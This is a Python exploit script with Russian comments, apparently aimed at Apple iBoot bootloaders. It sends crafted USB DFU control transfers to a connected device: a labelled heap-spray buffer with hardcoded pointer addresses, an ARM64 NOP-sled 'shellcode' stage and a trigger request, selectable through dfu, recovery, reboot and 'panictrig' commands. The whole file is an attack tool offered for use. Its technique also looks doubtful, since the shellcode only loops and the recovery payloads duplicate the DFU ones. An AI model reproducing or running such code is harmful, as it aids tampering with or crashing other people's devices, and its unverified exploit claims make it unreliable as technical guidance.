import usb.core
import usb.util
import time
from struct import pack
import os
import sys

APPLE_VID = 0x05AC
DFU_PID = 0x1227
RECOVERY_PID = 0x1281

# Адреса для iBoot-6338.0.0.200.19
STRUCT_PTR = 0xFC023828
CALLBACK_PTR = 0xFC00B000

# USB дескрипторы для iBoot-6338
USB_DESCRIPTOR = pack("<IIIIIIII",
    0x190209, 0x80050101, 0x409fa, 0x1fe0000,
    0x21070000, 0xa01, 0x8, 0x0
)

class Yara1nExploit:
    def __init__(self):
        self.dev = None
        self.in_dfu = False
        self.in_recovery = False

    def find_device(self, pid=DFU_PID):
        dev = usb.core.find(idVendor=APPLE_VID, idProduct=pid)
        if not dev:
            return None
        return dev

    def wait_for_device(self, pid=DFU_PID):
        print("[*] Ожидание устройства...")
        while True:
            dev = self.find_device(pid)
            if dev:
                print(f"[+] Найдено устройство: {dev}")
                return dev
            time.sleep(0.5)

    def build_dfu_payload(self):
        # Stage 1: Heap spray для iBoot-6338
        payload = b"A" * 0x100  # Уменьшаем размер
        payload += pack("<Q", STRUCT_PTR)
        payload += pack("<Q", CALLBACK_PTR)
        payload += USB_DESCRIPTOR  # Добавляем USB дескрипторы
        payload += b"\x42" * 0x10
        return payload

    def build_dfu_shellcode(self):
        # Stage 2: Минимальный shellcode
        shellcode = b"\x1F\x20\x03\xD5" * 8  # NOP sled
        shellcode += b"\x00\x00\x00\x14"     # b . (бесконечный цикл)
        return shellcode.ljust(0x100, b"\x00")  # Уменьшаем размер

    def build_recovery_payload(self):
        # Stage 1: Heap spray для Recovery
        payload = b"A" * 0x100  # Уменьшаем размер
        payload += pack("<Q", STRUCT_PTR)
        payload += pack("<Q", CALLBACK_PTR)
        payload += USB_DESCRIPTOR  # Добавляем USB дескрипторы
        payload += b"\x42" * 0x10
        return payload

    def build_recovery_shellcode(self):
        # Stage 2: Минимальный shellcode
        shellcode = b"\x1F\x20\x03\xD5" * 8  # NOP sled
        shellcode += b"\x00\x00\x00\x14"     # b . (бесконечный цикл)
        return shellcode.ljust(0x100, b"\x00")  # Уменьшаем размер

    def send_payload(self, payload: bytes, block=0):
        print(f"[>] Отправка payload ({len(payload)} байт, block={block})...")
        try:
            self.dev.ctrl_transfer(
                bmRequestType=0x21,
                bRequest=1,
                wValue=block,
                wIndex=0,
                data_or_wLength=payload,
                timeout=2000  # Увеличиваем таймаут
            )
            print("[+] Payload отправлен")
            return True
        except usb.core.USBError as e:
            print(f"[!] Ошибка при отправке: {e}")
            return False

    def clear_status(self):
        try:
            self.dev.ctrl_transfer(0x21, 4, 0, 0, [], timeout=2000)  # Увеличиваем таймаут
            print("[*] CLRSTATUS отправлен")
        except:
            pass

    def trigger(self):
        print("[>] Триггер...")
        try:
            resp = self.dev.ctrl_transfer(
                bmRequestType=0xA1,
                bRequest=3,
                wValue=0,
                wIndex=0,
                data_or_wLength=6,
                timeout=2000  # Увеличиваем таймаут
            )
            print(f"[+] Ответ: {list(resp)}")
            return True
        except usb.core.USBError as e:
            print(f"[!] Ошибка при триггере: {e}")
            return False

    def enter_dfu(self):
        print("[*] Переход в DFU...")
        self.dev = self.wait_for_device()
        try:
            self.dev.set_configuration()
        except usb.core.USBError:
            pass

        # Stage 1: Heap spray
        time.sleep(2)  # Увеличиваем задержку
        payload1 = self.build_dfu_payload()
        if not self.send_payload(payload1, block=0xFFFF):
            return False
        time.sleep(2)  # Увеличиваем задержку
        self.clear_status()
        
        # Stage 2: DFU shellcode
        time.sleep(2)  # Увеличиваем задержку
        payload2 = self.build_dfu_shellcode()
        if not self.send_payload(payload2, block=1):
            return False
        time.sleep(2)  # Увеличиваем задержку
        
        # Trigger и проверка
        if not self.trigger():
            return False
            
        # Проверяем, что устройство в DFU
        time.sleep(3)  # Увеличиваем задержку
        if self.find_device(DFU_PID):
            self.in_dfu = True
            print("[+] Устройство в DFU")
            return True
        return False

    def enter_recovery(self):
        print("[*] Переход в Recovery...")
        if not self.in_dfu:
            if not self.enter_dfu():
                return False
        
        # Stage 1: Heap spray для Recovery
        time.sleep(2)  # Увеличиваем задержку
        payload1 = self.build_recovery_payload()
        if not self.send_payload(payload1, block=0xFFFF):
            return False
        time.sleep(2)  # Увеличиваем задержку
        self.clear_status()
        
        # Stage 2: Recovery shellcode
        time.sleep(2)  # Увеличиваем задержку
        payload2 = self.build_recovery_shellcode()
        if not self.send_payload(payload2, block=1):
            return False
        time.sleep(2)  # Увеличиваем задержку
        
        # Trigger и проверка
        if not self.trigger():
            return False
            
        # Проверяем, что устройство в Recovery
        time.sleep(3)  # Увеличиваем задержку
        if self.find_device(RECOVERY_PID):
            self.in_recovery = True
            print("[+] Устройство в Recovery")
            return True
        return False

    def reboot(self):
        print("[*] Перезагрузка...")
        if not self.in_dfu and not self.in_recovery:
            if not self.enter_dfu():
                return False
        
        # Отправляем команду перезагрузки
        try:
            self.dev.ctrl_transfer(
                bmRequestType=0x21,
                bRequest=1,
                wValue=0,
                wIndex=0,
                data_or_wLength=b"\x00" * 8,
                timeout=2000  # Увеличиваем таймаут
            )
            print("[+] Команда перезагрузки отправлена")
            return True
        except usb.core.USBError as e:
            print(f"[!] Ошибка при перезагрузке: {e}")
            return False

def main():
    exploit = Yara1nExploit()
    
    if len(sys.argv) < 2:
        print("Использование: python3 exploit.py [dfu|recovery|reboot|panictrig]")
        return

    cmd = sys.argv[1].lower()
    if cmd == "dfu":
        exploit.enter_dfu()
    elif cmd == "recovery":
        exploit.enter_recovery()
    elif cmd == "reboot":
        exploit.reboot()
    elif cmd == "panictrig":
        print("[*] Тестирование паники...")
        exploit.dev = exploit.wait_for_device()
        try:
            exploit.dev.set_configuration()
        except usb.core.USBError:
            pass
        time.sleep(2)
        payload = b"A" * 0x100
        payload += pack("<Q", STRUCT_PTR)
        payload += pack("<Q", CALLBACK_PTR)
        payload += USB_DESCRIPTOR
        payload += b"\x42" * 0x10
        exploit.send_payload(payload, block=0xFFFF)
        time.sleep(2)
        exploit.clear_status()
        time.sleep(2)
        shellcode = b"\x1F\x20\x03\xD5" * 8
        shellcode += b"\x00\x00\x00\x14"
        exploit.send_payload(shellcode.ljust(0x100, b"\x00"), block=1)
        time.sleep(2)
        exploit.trigger()
    else:
        print("Неизвестная команда")

if __name__ == "__main__":
    main() 